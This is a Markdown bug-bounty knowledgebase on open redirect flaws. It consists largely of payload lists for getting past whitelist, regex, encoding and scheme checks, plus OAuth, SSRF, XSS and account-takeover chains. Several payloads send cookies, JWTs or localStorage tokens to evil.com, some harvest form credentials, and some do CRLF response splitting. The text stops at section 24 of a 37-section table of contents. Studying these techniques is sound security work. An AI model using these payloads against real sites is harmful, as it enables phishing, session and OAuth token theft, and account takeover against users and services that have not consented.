# Open Redirect - Complete Bug Bounty Knowledgebase

> **Research-grade reference for advanced bug bounty hunting, black-box testing, and Codex skill development.**
> Compiled from PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, OWASP, Diverto Research, ProjectDiscovery, and numerous bug bounty writeups.
> **Last Updated:** 2026-05-23

---

## Table of Contents

1. [Basics](#basics)
2. [Open Redirect Theory](#open-redirect-theory)
3. [URL Parsing Internals](#url-parsing-internals)
4. [URL Validation Weaknesses](#url-validation-weaknesses)
5. [Trusted Domain Abuse](#trusted-domain-abuse)
6. [Regex Bypass Payloads](#regex-bypass-payloads)
7. [Double Encoding Tricks](#double-encoding-tricks)
8. [CRLF Redirect Injection](#crlf-redirect-injection)
9. [Scheme Confusion Payloads](#scheme-confusion-payloads)
10. [Path Confusion Payloads](#path-confusion-payloads)
11. [Backslash Tricks](#backslash-tricks)
12. [Username@Host Tricks](#usernamehost-tricks)
13. [data: URI Payloads](#data-uri-payloads)
14. [javascript: Payloads](#javascript-payloads)
15. [DOM-Based Open Redirect](#dom-based-open-redirect)
16. [Client-Side Redirects](#client-side-redirects)
17. [OAuth redirect_uri Abuse](#oauth-redirect_uri-abuse)
18. [SSO Exploitation](#sso-exploitation)
19. [SSRF + Open Redirect Chains](#ssrf--open-redirect-chains)
20. [XSS + Open Redirect Chains](#xss--open-redirect-chains)
21. [Cache Poisoning Chains](#cache-poisoning-chains)
22. [Account Takeover Chains](#account-takeover-chains)
23. [Gadget Chains](#gadget-chains)
24. [URL Filter Bypass Payloads](#url-filter-bypass-payloads)
25. [Browser Quirks](#browser-quirks)
26. [Real World Case Studies](#real-world-case-studies)
27. [Fuzzing Payloads](#fuzzing-payloads)
28. [Automation Workflows](#automation-workflows)
29. [Recon Methodology](#recon-methodology)
30. [Nuclei Templates](#nuclei-templates)
31. [Tools and Scanners](#tools-and-scanners)
32. [Advanced Research](#advanced-research)
33. [Bug Bounty Writeups](#bug-bounty-writeups)
34. [Payload Collections](#payload-collections)
35. [WAF Bypasses](#waf-bypasses)
36. [Detection Techniques](#detection-techniques)
37. [References](#references)

---

## Basics

### What is Open Redirect?

An open redirect vulnerability occurs when a web application or server uses **unvalidated, user-supplied input** to redirect users to other sites. This allows an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.

**Example vulnerable URL:**
```
https://example.com/redirect?url=https://userpreferredsite.com
```

**Attacker-crafted malicious URL:**
```
https://example.com/redirect?url=https://evil.com
```

### Impact

- **Phishing campaigns:** Authentic-looking URLs with valid TLS certificates redirect to malicious sites
- **Session theft:** Chain with XSS to steal cookies, JWTs, or localStorage data
- **OAuth token theft:** Steal authorization codes via malicious `redirect_uri`
- **SSRF escalation:** Use open redirect to bypass SSRF filters
- **Cache poisoning:** Poison CDN/proxy caches with malicious redirects
- **Account takeover:** Chain with login flows to steal credentials
- **CSP bypass:** If whitelisted domains have open redirects, bypass CSP restrictions
- **Client-side path traversal:** Chain with other frontend vulnerabilities

### HTTP Redirection Status Codes

| Code | Text | Method Handling | Typical Use |
|------|------|----------------|-------------|
| `300` | Multiple Choices | Manual | Choices listed in body |
| `301` | Moved Permanently | GET unchanged, others may change to GET | Permanent reorganization |
| `302` | Found | GET unchanged, others may change to GET | Temporary unavailability |
| `303` | See Other | GET unchanged, others changed to GET (body lost) | After PUT/POST |
| `304` | Not Modified | Cached response still fresh | Conditional requests |
| `305` | Use Proxy | Deprecated | Must use proxy |
| `307` | Temporary Redirect | Method and body unchanged | Better than 302 for non-GET |
| `308` | Permanent Redirect | Method and body unchanged | Permanent, non-GET safe |

### Redirection Order of Precedence

1. **HTTP redirects** -- execute first (exist before page transmission)
2. **JavaScript redirects** -- execute before HTML redirects (scripts run before page fully loads)
3. **HTML `<meta>` redirects** -- execute last (after page completely loads)
4. **Post-load JS redirects** -- execute if no prior redirects occurred

---

## Open Redirect Theory

### Attack Surface

Open redirects can exist in:

1. **Query parameters:** `?url=`, `?redirect=`, `?next=`, `?return=`, `?redirect_uri=`
2. **Path-based:** `/redirect/http://evil.com` or `//evil.com`
3. **Fragment-based:** `#url=evil.com` (DOM-based)
4. **POST body:** JSON/XML payloads containing redirect URLs
5. **Headers:** `Referer`, `Origin`, `X-Forwarded-*`
6. **OAuth flows:** `redirect_uri` in authorization requests
7. **SSO flows:** SAML `RelayState`, OpenID `redirect_uri`

### Common Vulnerable Parameters

```
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

### Vulnerable Code Patterns

**Java (dangerous):**
```java
response.sendRedirect(request.getParameter("url"));
```

**PHP (dangerous):**
```php
$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);
```

**C# .NET (dangerous):**
```csharp
string url = request.QueryString["url"];
Response.Redirect(url);
```

**Rails (dangerous):**
```ruby
redirect_to params[:url]
```

**ASP.NET MVC 2 (dangerous - fixed in MVC 3):**
```csharp
return Redirect(returnUrl);
```

---

## URL Parsing Internals

### RFC3986 vs WHATWG URL Standard

The **critical discrepancy** between these two standards is the foundation of many bypass techniques:

**RFC3986 (General URI Framework):**
```
https://myweird\url.com/
       └────── hostname ──────┘
```
Backslash is part of the hostname.

**WHATWG (Web URL Standard - used by browsers):**
```
https://myweird\url.com/
       └──── hostname ────┘  └─ path ─┘
```
Backslash terminates the hostname and starts the path.

> **Key Insight:** WHATWG treats `\` as equivalent to `//`, meaning `https://trusted.com\evil.com/` is parsed by browsers as `https://trusted.com/` with path `/evil.com/`, but many server-side parsers see `trusted.com\evil.com` as the hostname.

### URL Structure (RFC3986)

```
scheme://[user[:password]@]host[:port]/path[?query][#fragment]
```

**Authority component:**
```
[userinfo "@"] host [":" port]
```

**Critical parsing differences:**
- Some parsers stop at first `/` after scheme
- Some parsers stop at `?` or `#`
- Some treat `@` as userinfo separator
- Some normalize Unicode before parsing
- Some decode percent-encoding before validation

### URL Parsing Library Behaviors

| Library | Backslash Handling | `@` Handling | Double Slash |
|---------|-------------------|--------------|--------------|
| Python `urllib` | RFC3986 | Standard | Standard |
| Java `URL` | Mixed | Standard | Standard |
| PHP `parse_url()` | Mixed | Standard | Standard |
| Node.js `url.parse()` | WHATWG-like | Standard | Standard |
| Browser (WHATWG) | Path separator | Standard | Standard |
| Ruby `URI` | RFC3986 | Standard | Standard |
| Go `net/url` | RFC3986 | Standard | Standard |

---

## URL Validation Weaknesses

### Blacklist Validation Failures

Blacklists are inherently flawed. Common bypass categories:

1. **Keyword substitution:** `java%0d%0ascript:` instead of `javascript:`
2. **Case variation:** `JaVaScRiPt:`, `HTTPS://`
3. **Encoding tricks:** URL encoding, double encoding, Unicode
4. **Scheme confusion:** `//evil.com`, `https:evil.com`
5. **Path traversal:** `../evil.com`
6. **Null bytes:** `evil%00.com`
7. **Alternative representations:** Unicode normalization

### Whitelist Validation Failures

1. **Prefix matching:** `trusted.com.evil.com` passes `trusted.com` check
2. **Suffix matching:** `evil.trusted.com` passes `.trusted.com` check
3. **Contains matching:** `eviltrusted.com` passes `trusted` check
4. **Regex flaws:** Unescaped dots, greedy matching
5. **Path confusion:** `trusted.com/../evil.com`
6. **Fragment abuse:** `trusted.com#evil.com`

### Host Validation Bypass Techniques

**IP Address Representations:**
```
# Decimal (DWORD)
http://3627734734          # = 216.58.214.206

# Hexadecimal
http://0xd83ad6ce          # = 216.58.214.206
http://0xd8.0x3a.0xd6.0xce

# Octal
http://0330.072.0326.0316  # = 216.58.214.206

# Mixed notation
http://0xd8.072.54990

# IPv6
http://[::216.58.214.206]
http://[::ffff:216.58.214.206]

# With credentials
http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
http://XY>.7d8TpZM@0xd8.0x3a.0xd6.0xce
```

---

## Trusted Domain Abuse

### Whitelisted Domain as Prefix

If the filter checks that the URL starts with or contains the whitelisted domain:

```
https://{whitelistdomain}.evil.com/
https://{whitelistdomain};.evil.com/
https://{whitelistdomain}\;.evil.com/
https://{whitelistdomain}%23evil.com/
```

### Injecting `@` Before First `/`

```
%40{whitelistdomain}%40evil.com
https://%40{whitelistdomain}%40evil.com/
https://{whitelistdomain}%40evil.com/
https://{whitelistdomain};%40evil.com/
https://{whitelistdomain}\;%40evil.com/
https://{whitelistdomain}\%40%40evil.com/
https://{whitelistdomain}:%40evil.com/
https://{whitelistdomain}:anything%40evil.com/
https://{whitelistdomain}%26%40evil.com/
https://{whitelistdomain}%26anything%40evil.com/
https://{whitelistdomain}%5B%40evil.com/
https://{whitelistdomain}:443%23\%40evil.com/
https://{whitelistdomain}?%40evil.com/
https://{whitelistdomain}%20%26%40evil.com#%20%40evil.com/
```

### Concatenation to Whitelisted Domain

```
https://{whitelistdomain}evil.com/
```

### Whitelisted Domain as Suffix

If the filter checks that the URL ends with the whitelisted domain:

```
https://evil{whitelistdomain}/
https://evil-{whitelistdomain}/
https://evil_{whitelistdomain}/
https://evil.{whitelistdomain}
```

### Erasing Whitelisted Domain

```
https://evil.com%00{whitelistdomain}/
https://evil.com%20{whitelistdomain}/
https://evil.com%09{whitelistdomain}/
https://evil.com%0A{whitelistdomain}/
https://evil.com%0D{whitelistdomain}/
https://evil.com%0D%0A{whitelistdomain}/
https://evil.com%0D%0A%40{whitelistdomain}/
https://evil.com/{whitelistdomain}/
https://evil.com//{whitelistdomain}/
https://evil.com///{whitelistdomain}/
https://evil.com/.{whitelistdomain}/
https://evil.com\{whitelistdomain}/
https://evil.com\\{whitelistdomain}/
https://evil.com\.{whitelistdomain}/
https://evil.com%40{whitelistdomain}/
https://evil.com/%40{whitelistdomain}/
https://evil.com\%40{whitelistdomain}/
https://evil.com%20%40{whitelistdomain}/
https://evil.com%20%26%40{whitelistdomain}/
https://evil.com%26{whitelistdomain}/
https://evil.com%26%40{whitelistdomain}/
https://evil.com%23{whitelistdomain}/
https://evil.com%23%40{whitelistdomain}/
https://evil.com%23\%40{whitelistdomain}/
https://evil.com%3F{whitelistdomain}/
https://evil.com%3F%40{whitelistdomain}/
https://evil.com%3Fd=http://{whitelistdomain}/
https://evil.com%3Fd={whitelistdomain}/
https://evil.com;https://{whitelistdomain}/
```

### Unescaped Dot in Regex

If the regex uses `.` (matches any char) instead of `\.` (matches literal dot):

```
https://{whitelistsubdomain}{whitelistdomain}/
https://{whitelistsubdomain}-{whitelistdomain}/
https://{whitelistsubdomain}_{whitelistdomain}/
```

---

## Regex Bypass Payloads

### Bypassing Common Regex Patterns

**Pattern:** `^https?://.*example\.com.*$`

**Bypasses:**
```
https://evil.com?example.com
https://evil.com#example.com
https://evil.com/path?redirect=example.com
https://evil.com@example.com
```

**Pattern:** `^https?://([a-z0-9]+\.)?example\.com/.*$`

**Bypasses:**
```
https://example.com.evil.com/
https://evil-example.com/
https://evil.example.com/
```

**Pattern:** `^https?://example\.com/.*$`

**Bypasses:**
```
https://example.com@evil.com/
https://evil.com?example.com
https://evil.com#example.com
https://example.com/../evil.com
```

### Host Validation Regex Bypass

```
https://{whitelistdomain}.-.evil.com/       # Chrome/Safari/Mozilla valid
https://{whitelistdomain}._.evil.com/       # Chrome/Safari/Mozilla valid

# Safari-specific valid domains:
https://{whitelistdomain}.,.evil.com/
https://{whitelistdomain}.;.evil.com/
https://{whitelistdomain}.!.evil.com/
https://{whitelistdomain}.'evil.com/
https://{whitelistdomain}.".evil.com/
https://{whitelistdomain}.(.evil.com/
https://{whitelistdomain}.).evil.com/
https://{whitelistdomain}.{evil.com/
https://{whitelistdomain}.}.evil.com/
https://{whitelistdomain}.*.evil.com/
https://{whitelistdomain}.&.evil.com/
https://{whitelistdomain}.`.evil.com/
https://{whitelistdomain}.+.evil.com/
https://{whitelistdomain}.=.evil.com/
https://{whitelistdomain}.~.evil.com/
https://{whitelistdomain}.$.evil.com/

# Mozilla-specific:
https://{whitelistdomain}.+.evil.com/
https://{whitelistdomain}.$.evil.com/
```

---

## Double Encoding Tricks

### Double URL Encoding

When a server decodes input twice, or when one layer decodes and another validates:

```
%2540 = @ (double-encoded)
%252f = / (double-encoded)
%255c = \ (double-encoded)
%252e = . (double-encoded)
%2500 = null byte (double-encoded)
%2509 = tab (double-encoded)
%250A = newline (double-encoded)
%250D = carriage return (double-encoded)
```

**Example bypass:**
```
https://example.com%252f%252f.evil.com/
https://example.com%255c%255c.evil.com/
```

### Triple Encoding

In rare cases with multiple processing layers:
```
%252540 = @ (triple-encoded)
```

---

## CRLF Redirect Injection

### CRLF in Redirect Context

CRLF (`%0D%0A`) can be injected into redirect URLs to manipulate headers:

```
?url=/%0D%0ASet-Cookie:mycookie=myvalue
?url=/%0D%0ALocation:https://evil.com
```

**Full response splitting payload:**
```
?redirect=/%0D%0A%0D%0A<script>alert(1)</script>
```

### CRLF for Bypassing Filters

```
java%0d%0ascript%0d%0a:alert(0)
%0AjAva%0d%0ascr%09ipT%0d%0a:prompt(document.domain)
%09jAv%09ascr%09ipT:prompt(document.domain)
```

---

## Scheme Confusion Payloads

### Missing/Alternative Schemes

```
//evil.com                    # Protocol-relative
///evil.com
////evil.com
/////evil.com

https:evil.com              # Missing slashes
http:evil.com

https:/evil.com             # Single slash
http:/evil.com

https:\evil.com            # Backslash (WHATWG treats as path)
http:\evil.com

https:////evil.com          # Triple slash
http:///evil.com
```

### Scheme Case Variations

```
HTTPS://evil.com
hTTps://evil.com
Http://evil.com
```

### Tab/Newline Before Scheme

```
%09https://evil.com
%0Ahttps://evil.com
%0Dhttps://evil.com
%20https://evil.com
```

---

## Path Confusion Payloads

### Path Traversal in Redirects

```
https://{whitelistdomain}/{whitelistpath}/../evil/path
https://{whitelistdomain}/{whitelistpath}/..\evil/path
https://{whitelistdomain}/{whitelistpath}/..\/evil/path
https://{whitelistdomain}/{whitelistpath}/../\evil/path
https://{whitelistdomain}/{whitelistpath}/....//evil/path
https://{whitelistdomain}/{whitelistpath}/..;/evil/path
https://{whitelistdomain}/{whitelistpath}/..%5cevil/path
https://{whitelistdomain}/{whitelistpath}/..%2fevil/path
https://{whitelistdomain}/{whitelistpath}/%2e%2e/evil/path
https://{whitelistdomain}/{whitelistpath}/%2e%2e\evil/path
https://{whitelistdomain}/{whitelistpath}/%2e%2e%2fevil/path
https://{whitelistdomain}/{whitelistpath}/%2e%2e%5cevil/path
```

### Null Byte to Truncate Appended Extensions

```
https://{whitelistdomain}/{whitelistpath}/../evil/path%00
```

### Path with Query String Confusion

```
http://evil.com?{whitelistdomain}/
http://evil.com#{whitelistdomain}/
```

---

## Backslash Tricks

### WHATWG vs RFC3986 Backslash Handling

The backslash trick exploits the difference between WHATWG and RFC3986:

```
https://trusted.com\evil.com/
https://trusted.com/\evil.com/
https://trusted.com\/evil.com/
https://trusted.com/\/evil.com/
https://trusted.com\\evil.com/
```

**Full backslash payload list:**
```
https://%65%78%61%6D%70%6C%65%2E%63%6F%6D
https:////example.com
https:///example.com
https://example.com
https:/example.com
https:example.com
https:\example.com
https:\example.com
https:\\example.com
https:\\example.com
https:/\/\example.com
https:\/\/example.com
https://\example.com
https:\//example.com
https://\/\example.com
https:\///example.com
https:/\\example.com
https:\/example.com
https:/\/example.com
https:\/\example.com
https://\example.com
https:\/example.com
https:/\example.com
https:\//example.com
https:/\example.com
https:\/example.com
////example.com
///example.com
//example.com
/example.com
example.com
\example.com
\example.com
\\example.com
\\example.com
/\/\example.com
\/\/example.com
//\example.com
\//example.com
///\example.com
\///example.com
/\\example.com
\\/example.com
/\/example.com
\/\example.com
//\example.com
\/example.com
/\example.com
\//example.com
/\example.com
\/example.com
```

---

## Username@Host Tricks

### Basic @ Redirection

```
http://www.trustedsite.com@evil.com/
http://user:password@evil.com/
```

### Multiple @ Symbols

```
http://3H6k7lIAiqjfNeN@trustedsite.com+@evil.com/
http://XY>.7d8TpZM@trustedsite.com+@evil.com/
http://3H6k7lIAiqjfNeN@trustedsite.com@evil.com/
http://XY>.7d8TpZM@trustedsite.com@evil.com/
http://trustedsite.com+&@evil.com#+@trustedsite.com/
```

### @ with Port and Fragment

```
http://evil.com:80#@trustedsite.com/
http://evil.com:80?@trustedsite.com/
```

### Tab-Separated @

```
http://evil.com	trustedsite.com/
```

### Semicolon @

```
//;@evil.com
http://;@evil.com
@evil.com
```

---

## data: URI Payloads

### Basic data URI for XSS via Redirect

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
```

**Decodes to:** `<script>alert("XSS")</script>`

### data URI with Whitelisted Domain Prefix

```
data:trustedsite.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
```

### data URI for Credential Theft

```
data:text/html,<form action="https://evil.com/steal" method="POST"><input name="data" value="<script>document.write(localStorage.getItem('token'))</script>"></form><script>document.forms[0].submit()</script>
```

---

## javascript: Payloads

### Basic javascript: Redirect

```javascript
javascript:alert(1)
javascript:alert(1);
//javascript:alert(1);
/javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1)
```

### javascript: with Backslash

```javascript
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
```

### javascript: with Tab

```javascript
/%09/javascript:alert(1);
/%09/javascript:alert(1)
```

### CRLF-Bypassed javascript:

```javascript
java%0d%0ascript%0d%0a:alert(0)
java%0ascript:alert(1)
java%09script:alert(1)
java%0dscript:alert(1)
```

### Case-Insensitive javascript:

```javascript
JaVaScRiPt:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
```

### javascript: with Newline Comment Breakout

```javascript
javascript://something%0aalert(1)
javascript://something%250aalert(1)
javascript://trustedsite.com?%a0alert%281%29
javascript://https://trustedsite.com/?z=%0Aalert(1)
```

### javascript: with Unicode/Encoded Characters

```javascript
javascript:alert(1)
javascript:alert(1)
ja
va	script:alert(1)
\j\x07v\x07\s\cr\i\pt\:\x07\l\ert\(1\)
javascript:alert(1)
Javas%26%2399;ript:alert(1)
%19Jav%09asc%09ript:https%20://trustedsite.com/%250Aconfirm%25281%2529
```

### javascript: with HTML Entities

```javascript
<>javascript:alert(1);
<>//evil.com
```

### javascript: for Credential Exfiltration

```javascript
javascript:inputs=document.querySelectorAll('input');creds='';for(i=0;i<inputs.length;i++){creds+=','+inputs[i].value};alert(creds);
javascript:alert(JSON.stringify(sessionStorage));
javascript:alert(JSON.stringify(localStorage));
javascript:fetch('https://evil.com/steal?token='+localStorage.getItem('jwt'));
```

---

## DOM-Based Open Redirect

### Vulnerable Sinks

```javascript
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

### Example Vulnerable Code

```javascript
// Vulnerable to open redirect
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
    location = url[0];
}
```

**Exploit:** `https://victim.com/page#https://evil.com`

### DOM-Based to XSS Escalation

If attacker controls the start of the string passed to redirection API:

```javascript
// Attacker controls location.hash
location = location.hash.slice(1);  // #javascript:alert(1)
```

**Impact:** DOM-based open redirect can escalate to JavaScript injection via `javascript:` pseudo-protocol.

### hash-based Redirect

```javascript
// Vulnerable pattern
var redirectTo = location.hash.substring(1);
window.location = redirectTo;
```

**Payload:** `https://victim.com/page#https://evil.com`

### postMessage-based Redirect

```javascript
// Vulnerable to postMessage redirect
window.addEventListener('message', function(e) {
    if (e.data.redirect) {
        window.location = e.data.redirect;
    }
});
```

**Exploit:** Send postMessage from attacker iframe with `{redirect: 'https://evil.com'}`

---

## Client-Side Redirects

### Meta Refresh Redirect

```html
<meta http-equiv="Refresh" content="0; URL=https://evil.com/" />
```

### JavaScript Redirect Methods

```javascript
window.location = "https://evil.com/";
window.location.href = "https://evil.com/";
window.location.replace("https://evil.com/");
window.location.assign("https://evil.com/");
document.location = "https://evil.com/";
self.location = "https://evil.com/";
top.location = "https://evil.com/";
parent.location = "https://evil.com/";
```

### Angular/React Router Redirect

```javascript
// Angular
this.router.navigateByUrl(userInput);

// React Router (v5)
<Redirect to={userInput} />

// React Router (v6) - useNavigate
navigate(userInput);
```

---

## OAuth redirect_uri Abuse

### OAuth 2.0 Authorization Request

```
GET /auth?client_id=23145&redirect_uri=https://example.com/callback&response_type=code&scope=openid%20profile&state=ab25c389ef00a3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

### redirect_uri Attacks

1. **Exact URI matching bypass:**
   ```
   redirect_uri=https://evil.com/callback
   redirect_uri=https://example.com.evil.com/callback
   redirect_uri=https://evil.com/example.com/callback
   ```

2. **Path matching bypass:**
   ```
   redirect_uri=https://example.com/callback/../evil
   redirect_uri=https://example.com/callback%2f..%2fevil
   ```

3. **Subdomain matching bypass:**
   ```
   redirect_uri=https://evil.example.com/callback
   ```

4. **Wildcards abuse:**
   ```
   redirect_uri=https://*.example.com/callback
   redirect_uri=https://example.com/*/callback
   ```

5. **URL encoding bypass:**
   ```
   redirect_uri=https%3A%2F%2Fevil.com%2Fcallback
   ```

### Authorization Code Injection

If `redirect_uri` is vulnerable to open redirect:

1. Attacker crafts: `https://oauth-server.com/auth?client_id=legit&redirect_uri=https://evil.com/steal`
2. Victim clicks, authenticates
3. OAuth server redirects to `https://evil.com/steal?code=AUTH_CODE`
4. Attacker exchanges code for access token

### redirect_uri Session Poisoning

Race condition attack when OAuth server stores `redirect_uri` in session:

1. Attacker sends authorization request with trusted `client_id` and malicious `redirect_uri`
2. Simultaneously, victim sends authorization request with trusted `client_id` and legitimate `redirect_uri`
3. Server overwrites session with attacker's `redirect_uri`
4. Victim approves legitimate request but gets redirected to attacker's URL

**Mitigation bypass:** Use `prompt=consent` to force consent screen.

### Dynamic Client Registration SSRF

OAuth registration endpoint parameters vulnerable to SSRF:

```json
POST /connect/register HTTP/1.1
Content-Type: application/json

{
  "redirect_uris": ["https://evil.com/callback"],
  "logo_uri": "http://collaborator.net/xss.html",
  "jwks_uri": "http://collaborator.net/keys.jwks",
  "sector_identifier_uri": "http://collaborator.net/uris.json",
  "request_uris": ["http://collaborator.net/request.jwt"],
  "client_uri": "http://collaborator.net/",
  "policy_uri": "http://collaborator.net/policy",
  "tos_uri": "http://collaborator.net/tos",
  "initiate_login_uri": "http://collaborator.net/login"
}
```

**SSRF triggers:**
- `logo_uri` -- fetched when displaying consent page
- `jwks_uri` -- fetched when validating JWT client assertions
- `sector_identifier_uri` -- fetched to get redirect URI list
- `request_uri` -- fetched at start of authorization process

### CVE-2021-26715: MITREid Connect SSRF via logo_uri

```
POST /openid-connect-server-webapp/register HTTP/1.1
Host: local:8080
Content-Type: application/json

{
  "redirect_uris": ["http://artsploit.com/redirect"],
  "logo_uri": "http://artsploit.com/xss.html"
}
```

Then visit: `/api/clients/{client_id}/logo` to trigger SSRF.

### CVE-2021-27582: MITREid Connect redirect_uri bypass via Spring autobinding

Mass assignment vulnerability on `/oauth/confirm_access`:

```
/authorize?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&scope=openid&prompt=consent&redirect_uri=http://trusted.example.com/redirect

/oauth/confirm_access?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&prompt=consent&scope=openid&redirectUri=http://malicious.example.com/steal_token
```

Note: `redirectUri` (camelCase) binds to `AuthorizationRequest.redirectUri` model attribute.

---

## SSO Exploitation

### SAML RelayState Abuse

```
https://idp.example.com/sso?SAMLRequest=...&RelayState=https://evil.com
```

Many SAML implementations don't validate `RelayState`, allowing redirect to arbitrary domains after authentication.

### OpenID Connect redirect_uri

Same as OAuth 2.0 `redirect_uri` attacks. Additional OpenID-specific endpoints:

```
/.well-known/openid-configuration
/.well-known/webfinger
```

### WebFinger User Enumeration

```
/.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
```

Response reveals whether user exists and issuer URL.

---

## SSRF + Open Redirect Chains

### Using Open Redirect to Bypass SSRF Filters

If an application has SSRF protection that blocks direct access to internal IPs but allows requests to whitelisted domains:

1. Find open redirect on whitelisted domain: `https://trusted.com/redirect?url=http://169.254.169.254/`
2. Use this in SSRF payload: `https://victim.com/fetch?url=https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/`
3. Server follows redirect to internal metadata service

### Reverse Proxy Misrouting

```
GET / HTTP/1.1
Host: internal-server.burpcollaborator.net
```

Some reverse proxies misroute based on malformed Host headers, exposing internal services.

### Apache HttpComponents URI Parsing Bug

```java
// Vulnerable code pattern
URI proxyUri = new URIBuilder(uri)
    .setHost(backendURL.getHost())
    .setPort(backendURL.getPort())
    .setScheme(backendURL.getScheme())
    .build();
```

**Exploit:** `GET @burp-collaborator.net/ HTTP/1.1` -> rewrote as `http://public-backend@burp-collaborator.net/`

### Host Header with Request Line Override

```
GET http://internal-website.mil/ HTTP/1.1
Host: xxxxxxx.mil
```

Some servers validate Host header but forget request line can specify different host.

### Incapsula Host Header Parsing

```
GET / HTTP/1.1
Host: incapsula-client.net:80@burp-collaborator.net
```

Incapsula routes to `incapsula-client.net` but backend parses as `http://incapsula-client.net:80@burp-collaborator.net/`

---

## XSS + Open Redirect Chains

### Open Redirect to XSS

If redirect parameter allows `javascript:` protocol:

```
?redirect=javascript:alert(1)
?redirect=javascript:fetch('https://evil.com/steal?c='+document.cookie)
```

### Stored DOM XSS via Login Redirect

When login page has DOM-based redirect after authentication:

```
http://victim.com/login?redirect=javascript:inputs=document.querySelectorAll('input');creds='';for(i=0;i<inputs.length;i++){creds+=','+inputs[i].value};alert(creds);
```

This is **stored DOM XSS** because payload is stored in the URL and executed after login completes.

### JWT Exfiltration via Login Redirect

```
http://victim.com/login?redirect=javascript:alert(JSON.stringify(sessionStorage));
```

For Authorization header / JWT implementations:
```
http://victim.com/login?redirect=javascript:alert(JSON.stringify(localStorage));
```

### XSS via OAuth redirect_uri

If OAuth `redirect_uri` allows `javascript:`:

```
/auth?client_id=123&redirect_uri=javascript:alert(document.domain)&response_type=token
```

---

## Cache Poisoning Chains

### Cache Poisoning via Open Redirect

If a CDN/proxy caches redirects based on URL:

1. Attacker requests: `https://victim.com/redirect?url=https://evil.com`
2. Server returns 302 to `https://evil.com`
3. CDN caches the 302 response for this URL
4. All users hitting this cached URL get redirected to evil.com

### Cache Key Manipulation

```
https://victim.com/redirect?url=evil.com&utm_source=1
https://victim.com/redirect?url=evil.com&utm_campaign=2
```

If cache key includes query string but redirect logic ignores some parameters, different cache entries may all redirect to evil.com.

### X-Forwarded-Host + Open Redirect

```
GET /redirect?url=/home HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com
```

If application uses `X-Forwarded-Host` to construct absolute redirect URLs:
```
Location: https://evil.com/home
```

---

## Account Takeover Chains

### OAuth + Open Redirect = Account Takeover

1. Attacker finds open redirect in OAuth `redirect_uri`
2. Attacker crafts: `https://oauth-server.com/auth?client_id=app&redirect_uri=https://victim.com/redirect?url=https://evil.com/steal`
3. Victim clicks, authenticates
4. OAuth server redirects to `https://victim.com/redirect?url=https://evil.com/steal?code=AUTH_CODE`
5. Victim's browser follows redirect to `https://evil.com/steal?code=AUTH_CODE`
6. Attacker exchanges code for victim's access token

### Login CSRF + Open Redirect

1. Attacker logs into their own account on victim.com
2. Attacker captures their own session cookie
3. Attacker crafts: `https://victim.com/login?redirect=https://evil.com/steal&session=ATTACKER_SESSION`
4. Victim clicks, gets attacker session, redirected to evil.com
5. Attacker now controls victim's account (if session fixation)

### Password Reset + Open Redirect

If password reset email contains redirect parameter:
```
https://victim.com/reset?token=abc&redirect=https://evil.com
```

After password reset, user redirected to evil.com where attacker can phish the new password.

---

## Gadget Chains

### Reverse Tab Nabbing

```html
<a href="https://victim.com/redirect?url=https://evil.com" target="_blank" rel="noopener">
```

If `rel="noopener"` is missing, evil.com can access `window.opener` and redirect original tab:
```javascript
if (window.opener) {
    window.opener.location = "https://evil.com/phishing";
}
```

### postMessage Gadget Chain

1. Find open redirect on trusted domain
2. Open trusted domain in iframe with redirect to attacker
3. From attacker page, send postMessage to trusted domain
4. Trusted domain receives message from "trusted" origin (due to redirect)
5. Trusted domain executes attacker-controlled postMessage handler

### Service Worker + Open Redirect

If attacker can register a service worker via open redirect:
```javascript
// Attacker-controlled SW registered from trusted origin
self.addEventListener('fetch', event => {
    event.respondWith(
        fetch(event.request).then(response => {
            // Intercept all requests from trusted origin
            return modifiedResponse;
        })
    );
});
```

---

## URL Filter Bypass Payloads

### Complete Payload List

```
/%09/example.com
/%2f%2fexample.com
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
////%5cexample.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
////example.com/%2f%2e%2e
////example.com/%2f..
////example.com//
///\;@example.com
///example.com
///example.com/
//google.com/%2f..
//www.whitelisteddomain.tld@google.com/%2f..
///google.com/%2f..
///www.whitelisteddomain.tld@google.com/%2f..
////google.com/%2f..
////www.whitelisteddomain.tld@google.com/%2f..
https://google.com/%2f..
https://www.whitelisteddomain.tld@google.com/%2f..
/https://google.com/%2f..
/https://www.whitelisteddomain.tld@google.com/%2f..
//www.google.com/%2f%2e%2e
//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
